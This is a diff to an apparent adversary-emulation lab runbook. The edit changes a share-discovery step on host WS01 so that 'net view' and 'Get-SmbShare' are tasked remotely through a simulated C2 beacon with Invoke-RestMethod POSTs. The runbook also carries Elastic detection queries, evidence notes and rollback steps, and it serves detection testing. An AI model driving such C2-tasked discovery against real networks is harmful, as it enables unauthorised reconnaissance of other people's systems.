@@ -110,20 +110,22 @@ powershell -ExecutionPolicy Bypass -File .\collect_ws01_evidence.ps1 -SinceMinut
 Elastic (skeleton): `host.name:"ws01" and event.code:1 and process.parent.name:"powershell.exe" and process.name:("net.exe" or "net1.exe" or "tasklist.exe" or "nltest.exe")` — **verify each `process.command_line` matches the tasked command** (T1135 net view /all; T1057 tasklist /s; T1069.002 net group /dom; T1069.001 net localgroup; T1482 nltest /domain_trusts; T1018 net view /domain + ping; T1124 net view time). Any `cmd /c ver` = fallback (config map broken → stop, fix config map).
 Ledger: S4 `VERIFIED IN REPO` (8/8) + E1 record_ids + c2sim results.
 
-## 3. S5 — ShareFinder → `ART-04-01` (WS01, `duc.user`)
+## 3. S5 — ShareFinder → `ART-04-01` (BEACON-RUN from C2 host; WS01 executes)
 
-Payload: none new (PowerShell + `scripts/lab_tools.py`).
+Payload: none new (PowerShell + `scripts/lab_tools.py`). Like a real operator, the discovery/share probes are
+DRIVEN REMOTELY through the beacon (`POST /cmd` / runbook entries 10-11) — the process runs on WS01 with
+parent = beacon powershell → DIRECT EVENT LINK:
 ```powershell
-net view \\FS01
-Get-SmbShare | Out-File C:\ProgramData\found_shares.txt          # mirror DFIR staging path ([LAB ASSUMPTION])
+Invoke-RestMethod -Method Post -Uri "$c2/cmd?session=$tok" -Body "net view \\FS01"
+Invoke-RestMethod -Method Post -Uri "$c2/cmd?session=$tok" -Body "powershell -NoProfile -Command `"Get-SmbShare | Out-File C:\ProgramData\found_shares.txt`""
 ```
+(Interactive typing on the WS01 console is only a fallback; it lowers the link tier to SUPPORTED.)
 Then on the C2 host, build the structured artifact (payload JSON lists readable shares incl. `FS01\Finance`):
 ```powershell
 python scripts/lab_tools.py artifact-new ART-04-01 RUN-20260928-02 5 6 --payload stage/ws01/found_shares.json -o stage/ws01/art04_01.json
 ```
-Evidence: WS01 E1 (net/powershell), E11 `found_shares.txt`, FS01 S5145 (if probed), `ART-04-01` sha256.
-Optional (keeps a DIRECT beacon link): task `powershell -c Get-SmbShare` via `/cmd` → E1 parent = beacon powershell;
-otherwise correlate by user/host/window + artifact hash (see §8b map).
+Evidence: WS01 E1 (parent = beacon; net/powershell child), E11 `found_shares.txt`, FS01 S5145 (if probed),
+`ART-04-01` sha256.
 Rollback: delete `C:\ProgramData\found_shares.txt`.
 
 ## 4. S6 — target decision → `ART-04-02` (C2 host, orchestration)
